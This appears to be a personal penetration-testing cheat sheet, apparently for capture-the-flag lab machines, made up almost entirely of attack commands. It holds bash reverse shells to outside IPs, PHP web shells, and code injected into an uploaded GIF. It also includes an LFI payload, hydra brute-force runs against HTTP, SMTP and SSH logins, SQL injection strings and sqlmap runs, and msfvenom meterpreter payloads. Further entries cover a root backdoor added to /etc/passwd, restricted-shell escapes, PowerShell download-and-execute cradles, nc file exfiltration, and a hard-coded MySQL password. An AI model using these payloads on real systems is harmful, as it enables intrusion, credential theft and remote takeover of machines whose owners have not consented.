######################### General ###############################
#
rw--r--r = 0644
chown www-data <file>
Add IP to hosts file
tar -xvf file.tar
gunzip file.gz
unzip file.zip

#################### BLUETOOTH HACKING #######################################
use hcitool scan
l2ping -i hci0 -s 600 -f 39:8C:14:6B:53:2D


//get a shell from webapp or web shell
cd /var/tmp && echo '#!/bin/bash' >> test.sh && echo 'bash -i >& /dev/tcp/192.168.60.128/444 0>&1' >> test.sh && chmod 777 test.sh && ./test.sh
<?php $cmd=$_GET['cmd']; print('$cmd'); ?> -- > get shells from uploaded image

##WEBSHELL~~
<?php echo system($_GET['cmd']); ?>
<?php $_GET['param1']($_GET['param2']); ?>
echo "bash -i >& /dev/tcp/10.10.14.17/1234 0>&1" | base64

convert -delay 20 -loop 0 *.jpg example.gif --> convert imge to gif

# Inject code to image or gif:
echo '<?php $cmd=$_GET["cmd"]; echo `$cmd`; ?>' >> bad.gif then upload

http://192.168.0.10/imfadministrator/uploads/ad54eabb6fde.gif?cmd=ls
-->> ?cmd=ls to use the cmd commands

## LOCAL FILE INCLUSIONS (LFI)
php://filter/convert.base64-encode/resource=config
http://172.20.10.3/?page=php://filter/convert.base64-encode/resource=config

######################### PASSWORDS CRACKING #######################
fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt yourfile.zip



######################### WEBISTE/PAGE VULNERABLELITY ##########################################
 check for LFI vulnerabilities due to the ?page=<input> structure. can use tool kadimus (https://github.com/P0cL4bs/Kadimus)
 	usage: ./kadimus -u 192.168.246.105/?page=login      ---> must be run in the directory. 3rd party tool always in opt


######################### Programs ##############################

steghide (extract) : steghide extract -sf <filename> (hit enter on passphrase) # Stego

strings filename.jpg{png,bmp,jpg} # Stego

cewl : cewl $ip -w cewl.txt

# hydra http
hydra -l <username> -P <wordlist> <IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid Password"

# hydra smtp attack
hydra -s 25 -v -V -l test@example.com -P /path/to/password/list.lst -t 1 -w 20 -f 192.168.10.5 smtp

# hdra ssh attack
hydra -L users.txt -P passwords.txt ssh://10.10.10.7 
hydra <ip address> ssh -vV -L <login list> -P <password list> -e s -t 10

# SQLmap: When running burp, copy the login or whatever request entirely, paste it to a file and save it as login.req //IMPORTANT
sqlmap -r login.req

# SSH login with id_rsa:
ssh -i id_rsa username@ip

# Send email with telnet over port 25
telnet ip 25
EHLO or HELO druckkammer.machine.htb <--- the domain does not matter just put something there
VRFY username@localhost <-- optional
mail from:<gillbates@microsucks.com>
rcpt to:<username@localhost>
data
Subject: YOU GOT OWNED <-- example 
MESSAGE OR SHELL CODE HERE!
							<---- blank line
.							<---- send with .
######################## SMTP Commands ###########################
HELO my.server.com
MAIL FROM: 
RCPT TO: 
DATA
From: Danny Dolittle 
To: Sarah Smith 
Subject: Email sample
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii

This is a test email for you to read.
.
QUIT

##################################################################
# fcrackzip 
fcrackzip -B	# run a benchmark 
fcrackzip -v -m zip6 -l 4-8 -u secret.zip	# crack zip file with password length 4-8 charakters
fcrackzip -v -D -u -p /usr/share/dict/words secret.zip	# use wordlist against zip file

# wfuzz
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.1.202/FUZZ
wfuzz -w wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ <---- look for common directories
wfuzz -w wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ.php <---- look for common files
wfuzz -z range,0-10 --hl 97 http://testphp.vulnweb.com/listproducts.php?cat=FUZZ <---- fuzzing parameters in url
wfuzz -z file,wordlist/others/common_pass.txt -d "uname=FUZZ&pass=FUZZ"  --hc 302 http://testphp.vulnweb.com/userinfo.php <---- fuzzing post requests
wfuzz -z file,wordlist/general/common.txt -b cookie=value1 -b cookie2=value2 http://testphp.vulnweb.com/FUZZ <---- fuzzing cookies
wfuzz -z file,wordlist/general/common.txt -b cookie=FUZZ http://testphp.vulnweb.com/ <---- fuzzing cookies 2
wfuzz -z file,wordlist/general/common.txt -H "myheader: headervalue" -H "myheader2: headervalue2" http://testphp.vulnweb.com/FUZZ <---- fuzzing custom headers
wfuzz -z list,GET-HEAD-POST-TRACE-OPTIONS -X FUZZ http://testphp.vulnweb.com/ <---- fuzzing http verbs
wfuzz -z file,wordlist/general/common.txt -p localhost:8080 http://testphp.vulnweb.com/FUZZ <---- using proxys
wfuzz -z file,wordlist/general/common.txt -p localhost:2222:SOCKS5 http://testphp.vulnweb.com/FUZZ <---- using socks proxys
python wfuzz -f /tmp/outfile,{json/html/txt} -w wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ <---- write results to file

# Burpsuite
# add upstream proxy and listener
go to "user options" and add "upstream proxy servers"
set Destination host to *
set target machine ip
set proxy port
eventually set authentication

then go to "Proxy" tab and add Proxy listener
bind to port 80 (this can be anything)
leave loopback only checked
switch to request handling and set "Redirect to host to 127.0.0.1 and redirect to port 80


######################### System Commands #######################
cat file.txt | grep -v 'Size: 157' (do not show anything that has "Size: 157" in it)
# Fix terminal:
stty size 
stty rows <value> cols <value>

# generate password if /etc/passwd file is writable:
openssl passswd -1 -salt username desiredpassword

# add yourself to /ect/passwd with root:
username:generated.password:0:0:root:/root:/bin/bash

# If dns is listening (nmap yields domain/dns):
add the box to /etc/hosts
nslookup                                                  
> server <TARGET BOX IP>                                    
> <TARGET BOX IP> (again)                                 

# Zome transfer to find sub domains (add all found domains to /etc/hosts)                                            
dig axfr @<IP ADDRESS> <DNS NAME> (found in the first step)--

# Find files:
find / -name Kernel.php 2>/dev/null

# Find SUID files:
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

find / -writable -type d 2>/dev/null      # world-writeable folders
find / -perm -222 -type d 2>/dev/null     # world-writeable folders
find / -perm -o w -type d 2>/dev/null     # world-writeable folders

find / -perm -o x -type d 2>/dev/null     # world-executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files

find / -name perl*
find / -name python*
find / -name gcc*
find / -name cc

scp -r <folder> ssh-username@ip:/home/pi 

######################### Shells ################################
<?php echo system($_REQUEST['ipp']); ?> # Edit a php file with this. Then call the page and append it.
Example: http://10.10.10.53/?ipp=ls or http://10.10.10.53/?ip=<pentestmonky nc shellcode> (URL encode THIS in burp (CTRL+U) !!!)

python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

######################## SQL Injection #########################
# Examples:
' OR 1 = 1 -- -
' OR '1'='1'-- -
admin'-- -
'*'


######################## MYSQL ###########################################
mysql -uroot -pH4u%QJ_H99 -h192.168.246.105
	Reading table information for completion of table and column names
	You can turn off this feature to get a quicker startup with -A
	
mysql -u root -h 192.168.28.215 -p H4u%QJ_H99



######################### SQLMAP ####################################
sqlmap -u http://192.168.246.105/?page=login –data=”user=user&pass=pass&submit=Login” -puser –dbms mysql –risk=3 –level=3
sqlmap -r capture.txt --dbs --threads 10 --level 5 --risk 3
sqlmap --level 5 --risk 3 --url "http://172.20.10.3/?page=add_value*"
sqlmap -D database --tables --url
sqlmap --dbs -- tables --url
sqlmap --tables -D databasename --url
sqlmap --columns -D databasename -T tablename --url





####################### Wireshark Filters #########################
ip.addr == IP (ip.src or ip.dstn)
dns or http (protocols like irc, ssh and so on)
tcp.port == 443 (udp.port == 53)
tcp.analysis.flags
!(arp or dns or icmp) (cleaning the tracefile from boring stuff)
tcp contains < keyword > (search for keywords)
http.request (http.response.code == 200)
tcp.flags.syn == 1 (tcp.flags.reset = 1) (look for syn attacks)
sip && rtp (VoIP)

tcp.flags.syn == 1

###################### METASPLOIT #################################
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.15.149 LPORT=4444 -e php/base64 -f raw > reverse.php
msfvenom --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=172.20.10.2 LPORT=4444 -f elf > shell



###################### NMAP ####################################
nmap -p 1-65535 -T4 -A -v 192.168.1.112 2>&1 | tee /var/tmp/scan.txt -> for intense scanning
nmap -p- -T4 -oA ports 172.20.10.2
grep -oP '\d{1,5}/open' ports.gnmap | sort -u > ports.lst
nmap -p ports.lst -sC -sV -oA targeted --script vuln 172.20.10.2
nmap -p -sC -sV -oA scripted --script scriptname 172.20.10.2


###################### Extensions #################################
.txt
.md
.rc
.conf
.config
.cnf
.inc
.php
.html
.cgi
.sh
.py
.pl

#################### Escape from shellcatraz ######################
# help from outside:
ssh restricted@10.10.10.51 -t "/bin/sh"
ssh restricted@10.10.10.51 -t "bash --noprofile"
ssh restricted@10.10.10.51 -t "() { :; }; /bin/bash"

# write to files using tee:
echo "your evil code" | tee script.sh

# invoke shell though scipting language:
python -c 'import pty;pty.spawn("/bin/bash")'
perl -e 'exec "/bin/sh";'
script -q /dev/null

#Full interactive shell
1) ctrl + z
2) stty raw -echo 
3) fg + enter

# some commands let you execute system commands bypassing shell restrictions:
ftp -> !/bin/sh
gdb -> !/bin/sh
more / less man -> !/bin/sh
vi / vim :!/bin/sh
scp -S /tmp/getMeOut.sh x y:
awk 'BEGIN {system("/bin/sh")}'
find / -name someName -exec /bin/sh \;

################### Powershell ##########################

# powershell locations on windows systems:
C:\Windows\System32\
C:\Windows\SysWow64\
C:\Windows\SysNative\

# download command thru powershell (like wget for unix)
IEX(New-Object Net.WebClient).downloadString('')
powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.232:8000/exploit.html') # this tells powershell to download everything it infds on the page
xp_cmdshell powershell iex(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.114:8000/gg.exe', 'C:\Users\mssql-svc\Desktop\gg.exe')
# tcpdump
tcpdump -i tun0

##FILE TRANSFERING##
nc -lvnp 8888 > file #attackers machine
nc -nv ip 8888 < file #target machine

